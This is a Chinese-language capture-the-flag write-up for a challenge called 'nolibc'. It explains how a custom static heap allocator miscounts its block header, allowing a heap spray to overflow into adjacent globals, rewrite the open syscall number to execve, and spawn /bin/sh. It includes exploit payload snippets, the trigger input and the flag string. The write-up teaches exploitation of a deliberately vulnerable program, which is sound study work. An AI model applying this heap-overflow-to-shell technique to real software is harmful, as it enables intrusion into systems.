# nolibc

## 题目简述

程序没有使用 libc，而是自己实现系统调用封装、字符串函数和一个固定大小的静态堆。登录后可以增删字符串，并把字符串保存到文件或从文件加载。文件名中禁止出现 `flag`，表面上像是一道文件读取题，实际漏洞位于自制分配器。

目标不是绕过文件名过滤，而是覆盖保存系统调用号的可写全局变量。把原本代表 `open` 的系统调用号从 `2` 改成 x86-64 的 `execve` 号 `59` 后，程序的“加载文件”功能会直接执行 `/bin/sh`。

## 解题过程

### 1. 静态堆多算了一个块头

分配器的块头为：

```c
typedef struct block {
    int size;
    struct block *next;
} block_t;                 // x86-64 下大小为 16 字节
```

静态堆本身只有 $256 \times 256 = 65536$ 字节，但初始化写成：

```c
heap_start = (block_t *)MAIN_HEAP_MEMORY;
heap_start->size = HEAP_SIZE;
```

`size` 表示块头之后可供用户使用的大小，正确值应为 `HEAP_SIZE - sizeof(block_t)`。当前写法把堆尾向后虚增了 16 字节，因此只要把堆精确填满，最后一个用户块就能覆盖 `MAIN_HEAP_MEMORY` 后面的 `.data` 变量。源码中的排列是：

```c
static unsigned char MAIN_HEAP_MEMORY[HEAP_SIZE];
static int SYS_READ  = 0;
static int SYS_WRITE = 1;
static int SYS_OPEN  = 2;
```

### 2. 精确把最后一次分配推到堆尾

先注册用户并重新登录。注册过程留下用户名、密码和一个很大的 `user_t`，其 `strings[0x7ff]` 指针数组占据大部分前置空间。之后连续添加 305 个长度为 128 的字符串。

调用 `alloc_mem(length + 1)` 后，129 字节会按 16 字节块头对齐成 144 字节，再加块头共消耗 160 字节：

```python
for _ in range(305):
    add_string(128, b"A" * 128)
```

结合注册阶段的分配，下一块用户区到静态堆末端恰好还剩 `0xd0` 字节。最后申请长度 220 的字符串并写入：

```python
payload  = b"a" * 0xd0
payload += p32(0)      # 保持 SYS_READ
payload += p32(1)      # 保持 SYS_WRITE
payload += p32(59)     # SYS_OPEN: open -> execve
add_string(len(payload), payload)
```

前 `0xd0` 字节用于填到 `MAIN_HEAP_MEMORY` 末端，后面三个 32 位整数落入相邻全局变量。保留前两个系统调用号，只把 `SYS_OPEN` 从 `2` 改为 `59`，可以避免破坏后续交互。

### 3. 让 load_from_file 调用 execve

`read_file` 原本按下面的方式打开文件：

```c
int fd = __syscall3(SYS_OPEN, (long)filename, 0, 0);
```

覆盖后，寄存器参数不变而系统调用号变为 `59`，等价于：

```c
execve(filename, NULL, NULL);
```

在触发前，官方脚本连续删除 100 个最前面的字符串。除了腾出空间外，这还会触发 `merge_free_blocks()` 的另一处错误：函数把空闲链表中地址最高的块直接扩展到静态堆末端，没有确认中间是否仍有已分配块。这样后续为文件名和文件缓冲区进行的大分配能够成功。

最后选择加载文件并把文件名设为 `/bin/sh`：

```text
5
/bin/sh
```

程序不会再执行真正的 `open`，而是用相同的三个参数进入 `execve`。服务进程被 `/bin/sh` 替换后即可执行 `cat flag.txt` 读取 flag。官方快速脚本还预先发送 `echo STOP`，用一个已知标记确认 shell 已经接管输入流。

仓库中服务端使用的 flag 为：

```text
SEKAI{shitty_heap_makes_a_shitty_security}
```

## 方法总结

本题展示了自制堆分配器中两类典型边界错误。第一处把整个数组长度当作用户区长度，漏减块头，从而在堆尾获得 16 字节越界写；第二处在合并空闲块后无条件把最后一个空闲块扩展到数组末端，产生覆盖仍在使用对象的重叠块。

利用时无需寻找 libc 地址或构造 ROP。程序把系统调用号存放在静态可写数据区，而该区域恰好紧邻自制堆。精确堆布局后只改写 `SYS_OPEN = 59`，再借现成的三参数系统调用封装执行 `/bin/sh`，是一条比传统控制流劫持更稳定的路径。
